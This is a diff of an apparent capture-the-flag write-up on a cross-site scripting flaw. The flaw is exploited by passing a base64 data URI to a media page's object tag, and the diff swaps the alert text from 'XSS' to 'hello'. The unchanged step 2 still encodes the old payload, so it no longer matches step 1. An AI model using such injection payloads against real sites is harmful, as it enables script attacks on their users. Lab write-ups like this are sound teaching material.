@@ -13,11 +13,11 @@ A Cross-Site Scripting (XSS) vulnerability exists in the media display feature. 
 - Since an `<object>` tag is used, you can inject a script using a data URI.
 
 **Steps:**
-1. XSS payload: `<script>alert('XSS')</script>`
+1. XSS payload: `<script>alert('hello')</script>`
 2. Base64 encode: `PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`
-3. Data URI: `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`
+3. Data URI: `data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGVsbG8nKTwvc2NyaXB0Pg==`
 4. Exploit:  
-   `/page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`
+   `/page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGVsbG8nKTwvc2NyaXB0Pg==`
 
 When visited, this triggers a JS alert and shows the flag.
 
